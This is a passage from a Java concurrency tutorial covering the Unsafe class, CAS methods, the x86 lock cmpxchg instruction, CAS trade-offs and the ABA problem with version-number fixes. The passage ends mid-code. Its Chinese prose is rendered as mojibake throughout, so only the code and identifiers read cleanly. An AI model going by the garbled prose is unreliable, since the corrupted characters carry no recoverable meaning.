<p><strong>Unsafeç±»çš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>âœ… <strong>ç›´æ¥æ“ä½œå†…å­˜</strong>ï¼šå¯ä»¥åƒCè¯­è¨€ä¸€æ ·ç›´æ¥è¯»å†™å†…å­˜</li>
<li>âœ… <strong>æä¾›CASæ–¹æ³•</strong>ï¼šcompareAndSwapIntã€compareAndSwapLongç­‰</li>
<li>âœ… <strong>ç»•è¿‡å®‰å…¨æ£€æŸ¥</strong>ï¼šå¯ä»¥åšä¸€äº›æ­£å¸¸æƒ…å†µä¸‹ä¸å…è®¸çš„æ“ä½œ</li>
<li>âš ï¸ <strong>ä¸æ¨èç›´æ¥ä½¿ç”¨</strong>ï¼šå±äº<code>sun.misc</code>åŒ…ï¼Œä¸æ˜¯å…¬å¼€APIï¼Œå¯èƒ½åœ¨ä¸åŒJDKç‰ˆæœ¬ä¸­å˜åŒ–</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆå«Unsafeï¼Ÿ</strong></p>
<ul>
<li>å› ä¸ºå®ƒç»•è¿‡äº†Javaçš„å®‰å…¨æ£€æŸ¥æœºåˆ¶</li>
<li>ä½¿ç”¨ä¸å½“å¯èƒ½å¯¼è‡´JVMå´©æºƒ</li>
<li>åªæœ‰ç³»ç»Ÿä»£ç ï¼ˆå¦‚JUCåŒ…ï¼‰æ‰åº”è¯¥ä½¿ç”¨</li>
</ul>
<p><strong>è·å–Unsafeå®ä¾‹ï¼ˆä»…äº†è§£ï¼Œä¸è¦ç›´æ¥ä½¿ç”¨ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âš ï¸ æ³¨æ„ï¼šè¿™åªæ˜¯æ¼”ç¤ºï¼Œç”Ÿäº§ç¯å¢ƒä¸è¦è¿™æ ·åš</span>
<span class="hljs-keyword">import</span> sun.misc.Unsafe;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;

<span class="hljs-comment">// é€šè¿‡åå°„è·å–Unsafeå®ä¾‹</span>
<span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();

<span class="hljs-comment">// æ­£å¸¸å¼€å‘ä¸­ï¼Œåº”è¯¥ä½¿ç”¨AtomicIntegerç­‰å°è£…å¥½çš„ç±»</span>
<span class="hljs-comment">// è€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨Unsafe</span>
</code></pre>
<p><strong>å®é™…å¼€å‘å»ºè®®ï¼š</strong></p>
<ul>
<li>âŒ <strong>ä¸è¦ç›´æ¥ä½¿ç”¨Unsafeç±»</strong></li>
<li>âœ… <strong>ä½¿ç”¨AtomicIntegerã€AtomicLongç­‰å°è£…å¥½çš„åŸå­ç±»</strong></li>
<li>âœ… <strong>è¿™äº›åŸå­ç±»å†…éƒ¨å·²ç»ä½¿ç”¨äº†Unsafeï¼Œæä¾›å®‰å…¨çš„API</strong></li>
</ul>
<h4 data-id="heading-104">compareAndSwapInt/Long/Objectæ–¹æ³•</h4>
<p><strong>Unsafeæä¾›çš„CASæ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é’ˆå¯¹intç±»å‹çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapInt</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> expected, <span class="hljs-type">int</span> x)</span>;

<span class="hljs-comment">// é’ˆå¯¹longç±»å‹çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapLong</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">long</span> expected, <span class="hljs-type">long</span> x)</span>;

<span class="hljs-comment">// é’ˆå¯¹å¯¹è±¡å¼•ç”¨çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapObject</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, Object expected, Object x)</span>;
</code></pre>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>Object o</code>ï¼šåŒ…å«è¦æ›´æ–°å­—æ®µçš„å¯¹è±¡</li>
<li><code>long offset</code>ï¼šå­—æ®µåœ¨å¯¹è±¡ä¸­çš„å†…å­˜åç§»é‡ï¼ˆå¯ä»¥ç†è§£ä¸ºå­—æ®µçš„"åœ°å€"ï¼‰</li>
<li><code>expected</code>ï¼šæœŸæœ›çš„æ—§å€¼</li>
<li><code>x</code>ï¼šè¦è®¾ç½®çš„æ–°å€¼</li>
</ul>
<p><strong>å®é™…ä½¿ç”¨ï¼ˆç®€åŒ–ç¤ºä¾‹ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®é™…å¼€å‘ä¸­ï¼Œä¸éœ€è¦è‡ªå·±å®ç°ï¼Œç›´æ¥ä½¿ç”¨AtomicIntegerå³å¯</span>
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// incrementAndGetå†…éƒ¨å°±æ˜¯ä½¿ç”¨CASå®ç°çš„</span>
count.incrementAndGet();  

<span class="hljs-comment">// ç­‰ä»·äºä»¥ä¸‹é€»è¾‘ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</span>
<span class="hljs-comment">// do {</span>
<span class="hljs-comment">//     current = count.get();</span>
<span class="hljs-comment">//     next = current + 1;</span>
<span class="hljs-comment">// } while (!count.compareAndSet(current, next));</span>
</code></pre>
<p><strong>æ–¹æ³•å¯¹æ¯”ï¼š</strong></p>
<ul>
<li><strong>compareAndSwapInt</strong>ï¼šç”¨äºintç±»å‹ï¼ˆ32ä½ï¼‰</li>
<li><strong>compareAndSwapLong</strong>ï¼šç”¨äºlongç±»å‹ï¼ˆ64ä½ï¼‰</li>
<li><strong>compareAndSwapObject</strong>ï¼šç”¨äºå¯¹è±¡å¼•ç”¨</li>
</ul>
<h4 data-id="heading-105">CASçš„åº•å±‚å®ç°ï¼ˆäº†è§£å³å¯ï¼‰</h4>
<p><strong>x86æ¶æ„ä¸‹çš„å®ç°åŸç†ï¼š</strong></p>
<p>JVMçš„HotSpotè™šæ‹Ÿæœºåœ¨x86æ¶æ„ä¸‹ï¼ŒCASæœ€ç»ˆä¼šç¼–è¯‘æˆCPUæŒ‡ä»¤ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// HotSpotæºç ï¼ˆç®€åŒ–ç‰ˆï¼Œäº†è§£å³å¯ï¼‰</span>
<span class="hljs-keyword">inline</span> jint <span class="hljs-title function_">Atomic::cmpxchg</span><span class="hljs-params">(...)</span> {
    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(
        <span class="hljs-string">"lock cmpxchgl %1,(%3)"</span>  <span class="hljs-comment">// å…³é”®ï¼šlockå‰ç¼€ + CMPXCHGæŒ‡ä»¤</span>
        ...
    )</span>;
}
</code></pre>
<p><strong>å…³é”®ç‚¹è§£æï¼š</strong></p>
<ol>
<li>
<p><strong>lockå‰ç¼€</strong>ï¼š</p>
<ul>
<li>é”å®šCPUæ€»çº¿æˆ–ç¼“å­˜è¡Œ</li>
<li>ç¡®ä¿åªæœ‰ä¸€ä¸ªCPUæ ¸å¿ƒèƒ½æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤</li>
<li>ä¿è¯åŸå­æ€§</li>
</ul>
</li>
<li>
<p><strong>cmpxchglæŒ‡ä»¤</strong>ï¼š</p>
<ul>
<li>x86æ¶æ„çš„æ¯”è¾ƒå¹¶äº¤æ¢æŒ‡ä»¤</li>
<li>ä¸€æ¡æŒ‡ä»¤å®Œæˆæ¯”è¾ƒå’Œäº¤æ¢</li>
<li>ç¡¬ä»¶çº§åˆ«çš„åŸå­æ“ä½œ</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜å±éšœ</strong>ï¼š</p>
<ul>
<li>ä¿è¯å¯è§æ€§ï¼ˆå…¶ä»–CPUèƒ½çœ‹åˆ°æ›´æ–°ï¼‰</li>
<li>é˜²æ­¢æŒ‡ä»¤é‡æ’åº</li>
</ul>
</li>
</ol>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>Javaä»£ç  â†’ JVM â†’ CPUæŒ‡ä»¤ï¼ˆlock cmpxchglï¼‰</li>
<li>ä¸€æ¡CPUæŒ‡ä»¤å®Œæˆï¼Œä¸ä¼šè¢«ä¸­æ–­</li>
<li>ç¡¬ä»¶ä¿è¯åŸå­æ€§ï¼Œéå¸¸é«˜æ•ˆ</li>
</ul>
<h3 data-id="heading-106">5.3 CASçš„ä¼˜ç¼ºç‚¹</h3>
<h4 data-id="heading-107">ä¼˜ç‚¹ï¼šæ— é”ã€é«˜æ€§èƒ½</h4>
<p><strong>æ— é”çš„ä¼˜åŠ¿ï¼š</strong></p>
<ol>
<li>
<p><strong>é¿å…çº¿ç¨‹é˜»å¡å’Œå”¤é†’çš„å¼€é”€</strong></p>
<ul>
<li>synchronizedä¼šè®©çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œéœ€è¦æ“ä½œç³»ç»Ÿå”¤é†’</li>
<li>CASå¤±è´¥ååªæ˜¯è‡ªæ—‹é‡è¯•ï¼Œçº¿ç¨‹ä¸ä¼šé˜»å¡</li>
<li>å‡å°‘äº†ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€</li>
</ul>
</li>
<li>
<p><strong>é¿å…æ­»é”</strong></p>
<ul>
<li>CASä¸éœ€è¦è·å–é”ï¼Œä¸ä¼šå‡ºç°æ­»é”é—®é¢˜</li>
<li>éå¸¸é€‚åˆåœ¨é«˜å¹¶å‘åœºæ™¯ä½¿ç”¨</li>
</ul>
</li>
<li>
<p><strong>é€‚åˆä½ç«äº‰åœºæ™¯</strong></p>
<ul>
<li>å½“å¤šä¸ªçº¿ç¨‹ç«äº‰ä¸æ¿€çƒˆæ—¶ï¼ŒCASæ€§èƒ½éå¸¸å¥½</li>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹CASéƒ½èƒ½æˆåŠŸï¼Œä¸éœ€è¦é‡è¯•</li>
</ul>
</li>
</ol>
<p><strong>æ€§èƒ½å¯¹æ¯”ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ synchronizedæ–¹å¼ï¼ˆæœ‰é”ï¼Œä¼šé˜»å¡ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// è·å–é”ï¼Œå¯èƒ½é˜»å¡ç­‰å¾…</span>
}

<span class="hljs-comment">// âœ… CASæ–¹å¼ï¼ˆæ— é”ï¼Œè‡ªæ—‹é‡è¯•ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  
    <span class="hljs-comment">// å†…éƒ¨å®ç°ï¼šè‡ªæ—‹é‡è¯•ï¼Œä¸é˜»å¡</span>
    <span class="hljs-comment">// do {</span>
    <span class="hljs-comment">//     current = count.get();</span>
    <span class="hljs-comment">// } while (!count.compareAndSet(current, current + 1));</span>
}
</code></pre>
<p><strong>æ€§èƒ½å¯¹æ¯”æ€»ç»“ï¼š</strong></p>

























<table><thead><tr><th>åœºæ™¯</th><th>CAS</th><th>synchronized</th></tr></thead><tbody><tr><td><strong>ä½ç«äº‰</strong></td><td>âœ… æ€§èƒ½å¾ˆå¥½ï¼ˆå¤§å¤šæ•°æˆåŠŸï¼Œå¾ˆå°‘é‡è¯•ï¼‰</td><td>âš ï¸ æ€§èƒ½ç¨å·®ï¼ˆæœ‰é”å¼€é”€ï¼‰</td></tr><tr><td><strong>é«˜ç«äº‰</strong></td><td>âš ï¸ æ€§èƒ½ä¸‹é™ï¼ˆå¤§é‡è‡ªæ—‹é‡è¯•ï¼ŒCPUæ¶ˆè€—é«˜ï¼‰</td><td>âœ… æ€§èƒ½æ›´å¥½ï¼ˆé˜»å¡ç­‰å¾…ï¼ŒèŠ‚çœCPUï¼‰</td></tr><tr><td><strong>æ¨èåœºæ™¯</strong></td><td>è¯»å¤šå†™å°‘ã€ç«äº‰ä¸æ¿€çƒˆ</td><td>ç«äº‰æ¿€çƒˆã€éœ€è¦äº’æ–¥è®¿é—®</td></tr></tbody></table>
<h4 data-id="heading-108">ç¼ºç‚¹ï¼šABAé—®é¢˜ã€è‡ªæ—‹å¼€é”€ã€åªèƒ½ä¿è¯ä¸€ä¸ªå˜é‡çš„åŸå­æ€§</h4>
<h5 data-id="heading-109">ABAé—®é¢˜</h5>
<p><strong>ä»€ä¹ˆæ˜¯ABAé—®é¢˜ï¼Ÿ</strong></p>
<p>ABAé—®é¢˜æ˜¯æŒ‡ï¼šå€¼ä»Aå˜æˆBï¼Œå†å˜å›Aï¼ŒCASä»ç„¶è®¤ä¸ºå€¼æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ã€‚</p>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>ä½ ç¦»å¼€æ—¶çœ‹åˆ°æ¡Œä¸Šæœ‰ä¸ªè‹¹æœï¼ˆAï¼‰</li>
<li>ä½ å›æ¥æ—¶æ¡Œä¸Šè¿˜æ˜¯è‹¹æœï¼ˆAï¼‰</li>
<li>ä½†å®é™…ä¸Šè¿™ä¸ªè‹¹æœå¯èƒ½è¢«æ¢è¿‡äº†ï¼ˆåŸæ¥çš„è¢«åƒäº†ï¼Œæ”¾äº†ä¸ªæ–°çš„ï¼‰</li>
<li>CASåªæ£€æŸ¥å€¼æ˜¯å¦ç›¸åŒï¼Œæ— æ³•å‘ç°"è¢«æ¢è¿‡"è¿™ä¸ªäº‹å®</li>
</ul>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">æ—¶é—´çº¿ï¼š
<span class="hljs-section">T1: çº¿ç¨‹1è¯»å–å€¼ = A</span>
<span class="hljs-section">T2: çº¿ç¨‹2ä¿®æ”¹å€¼ï¼šA -&gt; B</span>
<span class="hljs-section">T3: çº¿ç¨‹2ä¿®æ”¹å€¼ï¼šB -&gt; Aï¼ˆåˆæ”¹å›æ¥äº†ï¼‰</span>
<span class="hljs-section">T4: çº¿ç¨‹1æ‰§è¡ŒCAS(A, C)</span>
    ç»“æœï¼šCASæˆåŠŸï¼ä½†å®é™…ä¸Šå€¼å·²ç»è¢«ä¿®æ”¹è¿‡äº†
</code></pre>
<p><strong>ç¤ºä¾‹ä»£ç ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>);

<span class="hljs-comment">// çº¿ç¨‹1ï¼šå‡†å¤‡å°†Aæ”¹ä¸ºC</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get();  <span class="hljs-comment">// è¯»å–"A"</span>
    Thread.sleep(<span class="hljs-number">1000</span>);      <span class="hljs-comment">// ç­‰å¾…1ç§’</span>
    <span class="hljs-comment">// æ­¤æ—¶å€¼å¯èƒ½å·²ç»è¢«çº¿ç¨‹2æ”¹è¿‡ï¼Œä½†CASä»ç„¶æˆåŠŸ</span>
    ref.compareAndSet(old, <span class="hljs-string">"C"</span>);  <span class="hljs-comment">// æˆåŠŸï¼ä½†å¯èƒ½ä¸æ˜¯æœŸæœ›çš„ç»“æœ</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šA -&gt; B -&gt; A</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>);  <span class="hljs-comment">// A -&gt; B</span>
    ref.compareAndSet(<span class="hljs-string">"B"</span>, <span class="hljs-string">"A"</span>);  <span class="hljs-comment">// B -&gt; Aï¼ˆåˆæ”¹å›æ¥äº†ï¼‰</span>
});

t1.start();
t2.start();
</code></pre>
<p><strong>ABAé—®é¢˜çš„å±å®³ï¼š</strong></p>
<ul>
<li>åœ¨æ ˆã€é“¾è¡¨ç­‰æ•°æ®ç»“æ„ä¸­ï¼Œå¯èƒ½å¯¼è‡´é€»è¾‘é”™è¯¯</li>
<li>è™½ç„¶å€¼ç›¸åŒï¼Œä½†å¯¹è±¡å¯èƒ½å·²ç»è¢«æ›¿æ¢è¿‡</li>
<li>éœ€è¦é¢å¤–çš„ç‰ˆæœ¬å·æˆ–æ ‡è®°æ¥æ£€æµ‹</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ç‰ˆæœ¬å·ï¼šæ¯æ¬¡ä¿®æ”¹ç‰ˆæœ¬å·+1ï¼ˆAtomicStampedReferenceï¼‰</li>
<li>ä½¿ç”¨æ ‡è®°ä½ï¼šæ ‡è®°æ˜¯å¦è¢«ä¿®æ”¹è¿‡ï¼ˆAtomicMarkableReferenceï¼‰</li>
</ul>
<h5 data-id="heading-110">è‡ªæ—‹å¼€é”€</h5>
<p><strong>é—®é¢˜æè¿°ï¼š</strong></p>
<p>CASå¤±è´¥åä¼šä¸æ–­é‡è¯•ï¼ˆè‡ªæ—‹ï¼‰ï¼Œåœ¨é«˜ç«äº‰åœºæ™¯ä¸‹ä¼šæµªè´¹CPUã€‚</p>
<p><strong>å…·ä½“è¡¨ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// CASè‡ªæ—‹è¿‡ç¨‹ï¼ˆä¼ªä»£ç ï¼‰</span>
<span class="hljs-keyword">do</span> {
    current = value;  <span class="hljs-comment">// è¯»å–å½“å‰å€¼</span>
    next = current + <span class="hljs-number">1</span>;
} <span class="hljs-keyword">while</span> (!compareAndSet(current, next));  
<span class="hljs-comment">// å¦‚æœä¸€ç›´å¤±è´¥ï¼Œä¼šä¸€ç›´å¾ªç¯ï¼ˆè‡ªæ—‹ï¼‰ï¼Œæ¶ˆè€—CPU</span>
</code></pre>
<p><strong>é—®é¢˜ï¼š</strong></p>
<ul>
<li>âš ï¸ <strong>CPUæ¶ˆè€—é«˜</strong>ï¼šè‡ªæ—‹ä¼šæŒç»­å ç”¨CPUï¼Œä¸åšå…¶ä»–å·¥ä½œ</li>
<li>âš ï¸ <strong>é«˜ç«äº‰æ—¶æ€§èƒ½ä¸‹é™</strong>ï¼šå¤§é‡çº¿ç¨‹åŒæ—¶CASï¼Œå¤±è´¥ç‡é«˜ï¼Œè‡ªæ—‹æ—¶é—´é•¿</li>
<li>âš ï¸ <strong>å¯èƒ½å¯¼è‡´CPU 100%</strong>ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½åœ¨è‡ªæ—‹ï¼ŒCPUæ»¡è½½ä½†æ•ˆç‡ä½</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li><strong>é™åˆ¶è‡ªæ—‹æ¬¡æ•°</strong>ï¼šè¶…è¿‡ä¸€å®šæ¬¡æ•°åæ”¾å¼ƒ</li>
<li><strong>è‡ªé€‚åº”è‡ªæ—‹</strong>ï¼šæ ¹æ®å†å²æˆåŠŸç‡åŠ¨æ€è°ƒæ•´è‡ªæ—‹æ¬¡æ•°</li>
<li><strong>è‡ªæ—‹å¤±è´¥åé˜»å¡</strong>ï¼šè‡ªæ—‹ä¸€æ®µæ—¶é—´åå¦‚æœè¿˜å¤±è´¥ï¼Œå°±é˜»å¡ç­‰å¾…</li>
</ol>
<p><strong>æ€§èƒ½å»ºè®®ï¼š</strong></p>
<ul>
<li>ä½ç«äº‰åœºæ™¯ï¼šä½¿ç”¨CASï¼ˆè‡ªæ—‹å¼€é”€å°ï¼‰</li>
<li>é«˜ç«äº‰åœºæ™¯ï¼šè€ƒè™‘ä½¿ç”¨é”ï¼ˆé˜»å¡ç­‰å¾…ï¼ŒèŠ‚çœCPUï¼‰</li>
</ul>
<h5 data-id="heading-111">åªèƒ½ä¿è¯ä¸€ä¸ªå˜é‡çš„åŸå­æ€§</h5>
<p><strong>é—®é¢˜æè¿°ï¼š</strong></p>
<p>CASåªèƒ½åŸå­åœ°æ›´æ–°ä¸€ä¸ªå˜é‡ã€‚å¦‚æœéœ€è¦å¯¹å¤šä¸ªå˜é‡è¿›è¡ŒåŸå­æ“ä½œï¼ŒCASæ— æ³•ç›´æ¥ä¿è¯ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// âŒ è¿™ä¸¤ä¸ªæ“ä½œä¸æ˜¯åŸå­çš„</span>
count1.incrementAndGet();  <span class="hljs-comment">// æ“ä½œ1</span>
count2.incrementAndGet();  <span class="hljs-comment">// æ“ä½œ2</span>
<span class="hljs-comment">// é—®é¢˜ï¼šä¸¤ä¸ªæ“ä½œä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸ªé—®é¢˜ï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœéœ€è¦ä¿è¯count1å’Œcount2åŒæ—¶æ›´æ–°ï¼ŒCASæ— æ³•åšåˆ°</li>
<li>ä¸¤ä¸ªç‹¬ç«‹çš„CASæ“ä½œä¹‹é—´æ²¡æœ‰åŸå­æ€§ä¿è¯</li>
<li>å¯èƒ½å¯¼è‡´æ•°æ®ä¸ä¸€è‡´</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li><strong>ä½¿ç”¨synchronized</strong>ï¼šå°†å¤šä¸ªæ“ä½œæ”¾åœ¨åŒæ­¥å—ä¸­</li>
<li><strong>ä½¿ç”¨é”</strong>ï¼šReentrantLockç­‰</li>
<li><strong>åˆå¹¶å˜é‡</strong>ï¼šå°†å¤šä¸ªå˜é‡åˆå¹¶ä¸ºä¸€ä¸ªå¯¹è±¡ï¼ŒCASæ›´æ–°æ•´ä¸ªå¯¹è±¡</li>
<li><strong>ä½¿ç”¨AtomicReference</strong>ï¼šå°†å¤šä¸ªå€¼å°è£…åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ–¹æ¡ˆ1ï¼šä½¿ç”¨synchronized</span>
<span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
    count1++;
    count2++;
}

<span class="hljs-comment">// âœ… æ–¹æ¡ˆ2ï¼šåˆå¹¶ä¸ºå¯¹è±¡</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CountPair</span> {
    <span class="hljs-type">int</span> count1, count2;
}
AtomicReference&lt;CountPair&gt; pair = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
</code></pre>
<h3 data-id="heading-112">5.4 ABAé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-113">ABAé—®é¢˜çš„äº§ç”Ÿåœºæ™¯</h4>
<p><strong>å…¸å‹åœºæ™¯ï¼šæ— é”æ ˆçš„å®ç°</strong></p>
<p>åœ¨å®ç°æ— é”æ•°æ®ç»“æ„ï¼ˆå¦‚æ ˆã€é˜Ÿåˆ—ï¼‰æ—¶ï¼ŒABAé—®é¢˜ç‰¹åˆ«å®¹æ˜“å‡ºç°ã€‚</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼ˆæ— é”æ ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç®€åŒ–ç‰ˆæ— é”æ ˆ</span>
AtomicReference&lt;Node&gt; head = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();

<span class="hljs-comment">// å‡ºæ ˆæ“ä½œ</span>
<span class="hljs-keyword">public</span> Node <span class="hljs-title function_">pop</span><span class="hljs-params">()</span> {
    Node oldHead;
    Node newHead;
    <span class="hljs-keyword">do</span> {
        oldHead = head.get();      <span class="hljs-comment">// 1. è¯»å–å¤´èŠ‚ç‚¹A</span>
        <span class="hljs-keyword">if</span> (oldHead == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        newHead = oldHead.next;    <span class="hljs-comment">// 2. å‡†å¤‡è®¾ç½®æ–°çš„å¤´èŠ‚ç‚¹</span>
        <span class="hljs-comment">// é—®é¢˜ï¼šå¦‚æœåœ¨æ­¥éª¤1å’Œ3ä¹‹é—´ï¼Œheadä»Aå˜æˆBå†å˜å›A</span>
        <span class="hljs-comment">// CASä»ç„¶ä¼šæˆåŠŸï¼Œä½†å®é™…ä¸Šå¤´èŠ‚ç‚¹å·²ç»è¢«æ¢è¿‡äº†ï¼</span>
    } <span class="hljs-keyword">while</span> (!head.compareAndSet(oldHead, newHead));  <span class="hljs-comment">// 3. CASæ›´æ–°</span>
    
    <span class="hljs-keyword">return</span> oldHead;
}
</code></pre>
<p><strong>ABAé—®é¢˜çš„æ—¶é—´çº¿ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">T1: çº¿ç¨‹1è¯»å– <span class="hljs-attr">head</span> = A
T2: çº¿ç¨‹2æ‰§è¡Œï¼š<span class="hljs-attr">head</span> = A -&gt; B -&gt; Aï¼ˆå…ˆpushå†popï¼Œåˆå›åˆ°Aï¼‰
T3: çº¿ç¨‹1æ‰§è¡ŒCAS(A, newHead)
    ç»“æœï¼šCASæˆåŠŸï¼ä½†æ­¤æ—¶Aå·²ç»ä¸æ˜¯åŸæ¥çš„Aäº†
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¼šæœ‰é—®é¢˜ï¼Ÿ</strong></p>
<ul>
<li>è™½ç„¶headçš„å€¼è¿˜æ˜¯Aï¼Œä½†AæŒ‡å‘çš„èŠ‚ç‚¹å¯èƒ½å·²ç»è¢«ä¿®æ”¹è¿‡</li>
<li>å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±æˆ–é€»è¾‘é”™è¯¯</li>
<li>CASæ— æ³•æ£€æµ‹åˆ°"å€¼è¢«æ¢è¿‡"è¿™ä¸ªäº‹å®</li>
</ul>
<h4 data-id="heading-114">ç‰ˆæœ¬å·æœºåˆ¶ï¼ˆè§£å†³æ€è·¯ï¼‰</h4>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong> åœ¨å€¼çš„åŸºç¡€ä¸Šå¢åŠ ç‰ˆæœ¬å·ï¼Œæ¯æ¬¡ä¿®æ”¹ç‰ˆæœ¬å·é€’å¢</p>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>å°±åƒç»™æ¯æ¬¡ä¿®æ”¹æ‰“ä¸Šæ—¶é—´æˆ³</li>
<li>å³ä½¿å€¼ç›¸åŒï¼Œç‰ˆæœ¬å·ä¹Ÿä¸åŒ</li>
<li>CASæ—¶åŒæ—¶æ£€æŸ¥å€¼å’Œç‰ˆæœ¬å·</li>
</ul>
<p><strong>å®ç°æ€è·¯ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç è¯´æ˜</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionedValue</span> {
    Object value;     <span class="hljs-comment">// å®é™…å€¼</span>
    <span class="hljs-type">int</span> version;      <span class="hljs-comment">// ç‰ˆæœ¬å·</span>
}

<span class="hljs-comment">// CASæ“ä½œ</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(Object expectedValue, <span class="hljs-type">int</span> expectedVersion, 
                      Object newValue, <span class="hljs-type">int</span> newVersion)</span> {
    <span class="hljs-keyword">if</span> (currentValue == expectedValue &amp;&amp; currentVersion == expectedVersion) {
        <span class="hljs-comment">// å€¼å’Œç‰ˆæœ¬å·éƒ½åŒ¹é…ï¼Œæ‰æ›´æ–°</span>
        value = newValue;
